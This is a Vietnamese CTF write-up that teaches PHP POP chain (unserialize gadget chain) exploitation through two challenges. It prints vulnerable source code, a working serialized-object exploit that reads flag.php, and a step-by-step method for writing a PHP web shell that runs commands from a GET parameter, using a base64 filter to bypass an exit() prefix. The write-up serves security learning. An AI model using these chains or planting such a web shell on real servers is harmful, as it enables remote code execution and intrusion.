---
title: PHP POP Chain
description: Just a series for php pop chain exploition  
author: to^
date: 2022-04-22 22:27:00 +0700
categories: [WebSec, CTF]
tags: [pop chain]     # TAG names should always be lowercase
img_path: /assets/img/
image:
 src: popChain/pop_chain.png
 alt: pop chain logo
 width: 1000
 height: 400
---

Ở post này mình sẽ viết về cách khai thác PHP POP Chain mà mình học được qua các bài CTF.

PHP POP Chain còn được gọi là Code Reuse Attack là một kĩ thuật hoạt động dựa trên việc sử dụng các đoạn code có sẵn (gadget) và liên kết (chain) chúng lại với nhau để làm thay đổi luồng thực thi của chương trình theo ý muốn của attacker.

Thường thì kĩ thuật này sẽ được áp dụng khi một serialized object được đưa vào hàm `unserialize()` và sử dụng đồng thời các [magic methods](https://www.php.net/manual/en/language.oop5.magic.php) để chain gadgets lại với nhau. 

![pop chain step](popChain/pop_chain_step.png)
_pop chain step_

## 1. Ezpop - mrctf2020

### _Link challenge_
<https://buuoj.cn/challenges#[MRCTF2020]Ezpop>

### _Overview_
![overview](popChain/mrctf2020/EzPop/source_code.png)
_overview_ 

### Source

```php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
```

### _Phân tích_
`pop` get param sẽ được `unserialize` nếu được gửi đến server. Lướt lên trên ta thấy class Show có khai báo một magic methods là `__wakeup` -> đây là first gadget. Class Modifier có chứa một method đặc biệt `__invoke`
\- "The \__invoke() method is called when a script tries to call an object as a function." -> dùng hàm này để include flag.php -> last gadget.

Mình sẽ lợi dụng `__toString` và `__wakeup` của class Show. Hàm `preg_match` sử dụng `$this->source` làm tham số thứ 2 vì vậy nếu gán `source = new Show()` thì sẽ trigger được `__toString`

Tiếp tục hàm `__toString` gọi đến `$this->str->source` suy ra nếu ta gán `str = new Test()` thì sẽ tương đương với `new Test()->source` -> trigger `__get` của class Test. Tới đây muốn chain tới gadget cuối thì cần gán `p = new Modifier()` và ở Modifier gán cho `var='php://filter/convert.base64-encode/resource=flag.php'` là xong.

### _Khai thác_

exploit code:
```php
<?php

class Modifier {
    protected $var = 'php://filter/convert.base64-encode/resource=flag.php';
}


class Test{
    public $p;
    public function __construct(){
        $this->p = new Modifier();
    }
}

class Show{
    public $source;
    public $str;

}
$a = new Show();
$a -> source = new Show();
$a -> source -> str = new Test();

echo urlencode(serialize($a));
?>
```

![send payload](popChain/mrctf2020/EzPop/send_payload.png)
_send payload_ 

![flag.php](popChain/mrctf2020/EzPop/flag_php.png)
_flag.php_

> flag{9f937575-162d-4d4b-8030-c8859c08ac19}
{: .prompt-info  } 

___

## 2. EzPOP - EIS2019

### _Link challenge_
<https://buuoj.cn/challenges#[EIS%202019]EzPOP>

### _Source_

```php
<?php
error_reporting(0);

class A {

    protected $store;

    protected $key;

    protected $expire;

    public function __construct($store, $key = 'flysystem', $expire = null) {
        $this->key = $key;
        $this->store = $store;
        $this->expire = $expire;
    }

    public function cleanContents(array $contents) {
        $cachedProperties = array_flip([
            'path', 'dirname', 'basename', 'extension', 'filename',
            'size', 'mimetype', 'visibility', 'timestamp', 'type',
        ]);

        foreach ($contents as $path => $object) {
            if (is_array($object)) {
                $contents[$path] = array_intersect_key($object, $cachedProperties);
            }
        }

        return $contents;
    }

    public function getForStorage() {
        $cleaned = $this->cleanContents($this->cache);

        return json_encode([$cleaned, $this->complete]);
    }

    public function save() {
        $contents = $this->getForStorage();

        $this->store->set($this->key, $contents, $this->expire);
    }

    public function __destruct() {
        if (!$this->autosave) {
            $this->save();
        }
    }
}

class B {

    protected function getExpireTime($expire): int {
        return (int) $expire;
    }

    public function getCacheKey(string $name): string {
        return $this->options['prefix'] . $name;
    }

    protected function serialize($data): string {
        if (is_numeric($data)) {
            return (string) $data;
        }

        $serialize = $this->options['serialize'];

        return $serialize($data);
    }

    public function set($name, $value, $expire = null): bool{
        $this->writeTimes++;

        if (is_null($expire)) {
            $expire = $this->options['expire'];
        }

        $expire = $this->getExpireTime($expire);
        $filename = $this->getCacheKey($name);

        $dir = dirname($filename);

        if (!is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {
                // Failed to create
            }
        }

        $data = $this->serialize($value);

        if ($this->options['data_compress'] && function_exists('gzcompress')) {
            // data compression
            $data = gzcompress($data, 3);
        }

        $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
        $result = file_put_contents($filename, $data);

        if ($result) {
            return true;
        }

        return false;
    }

}

if (isset($_GET['src']))
{
    highlight_file(__FILE__);
}

$dir = "uploads/";

if (!is_dir($dir))
{
    mkdir($dir);
}
unserialize($_GET["data"]);
```

### __Phân tích__

Thoạt nhìn vào đoạn code này thì mình phát hiện một thứ khá thú vị `file_put_contents` xuất hiện ở class B trong hàm `set()`, hàm này thực hiện việc ghi `$data` vào `$filename` => có thể tận dụng để ghi một php shell trên server 😋. Ta sẽ cùng truy ngược lại các giá trị liên quan tới chúng.

- filename: được gán bằng `$this->getCacheKey($name)` với `$name` là tham số truyền vào và được prepend với một giá trị trong `options['prefix']` của class.
```php
    public function getCacheKey(string $name): string {
        return $this->options['prefix'] . $name;
    }
``` 
- data: được gán bằng `$this->serialize($value)` với `$value` là tham số truyền vào và `$serialize` lấy từ một giá trị trong `options['serialize']` của class.
```php
    protected function serialize($data): string {
        if (is_numeric($data)) {
            return (string) $data;
        }

        $serialize = $this->options['serialize'];

        return $serialize($data);
    }
```
- expire: được gán bằng `$this->getExpireTime($expire);` với `$expire` là tham số truyền vào
```php
    protected function getExpireTime($expire): int {
        return (int) $expire;
    }
```

Nhưng ở đây nảy sinh ra một vấn đề 🤔, vì `$data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;` $data truyền vào mặc dù là một "User-Controllable Input" nhưng bởi vì được append vào cuối chuỗi nên khi thực thi shell thì sẽ thoát do `exit()`. [Đây](https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list) là một bài post hay về các cách bypass hàm này
và mình sẽ làm theo cách base64 decode.

Đến đây ta biết được last gadget sẽ là method `set()` của class B vậy class A sẽ làm nhiệm vụ chain tới B. Nhìn lại source thì mình phát hiện được magic method `__destruct` gọi tới `save()` ở trong `save()` gọi `$this->store->set($this->key, $contents, $this->expire);` => cần gán `store = new class B()`. Và `$key, $content, $expire` sẽ ứng với `$name, $value, $expire`

- key = "shell.php"
- expire gán đại bằng "bla".
- content được gán bằng return value của `$this->getForStorage();`, mình sẽ contruct sao cho `getForStorage()` trả về `[[],"PD9jdWMgY3VjdmFzYigpOz8+"]`
  - `$cache = array();`
  - `$complete = base64_encode("xxx".base64_encode('<?php system($_GET[\'cmd\'])?>'));`  ở đây cần thêm vào trước 3 kí tự bởi vì `<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n` sẽ biến thành `php//000000000000exit` khi dùng php wrapper -> length = 21, mà một nhóm chứa 4 kí tự base64 sẽ được decode thành 3 bytes nên ta phải thêm 3 bytes `xxx` vào trước để tránh làm "hỏng" web shell.


Sau cùng `$value="W1tdLCJQRDl3YUhBZ2MzbHpkR1Z0S0NSZlIwVlVXeWRqYldRblhTa1wvUGc9PSJd"` nên ở đoạn code `$data = $this->serialize($value);` cần base64 decode trở lại và `$data` sẽ bằng `[[],"PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk\/Pg=="]` -> `$this->options['serialize'] = "base64_decode"`. Lần decode cuối cùng là lúc ghi vào file `shell.php` dùng php wrapper và lưu ý các kí tự không hợp lệ sẽ bị bỏ qua. 

Cuối cùng để ghi thành công một php shell lên server chỉ cần set `$this->options['prefix'] = 'php://filter/write=convert.base64-decode/resource='` 🤗

### _Khai thác_
Kết quả:
![result](popChain/eis2019/EZPOP/result.png)
_result_

> flag{94d92ddd-e935-46d4-93ef-f4fb272bd81c}
{: .prompt-info  }




## Tài liệu tham khảo
<https://websec.files.wordpress.com/2010/11/rips_ccs.pdf>

<https://vickieli.dev/insecure%20deserialization/pop-chains/>

<https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list>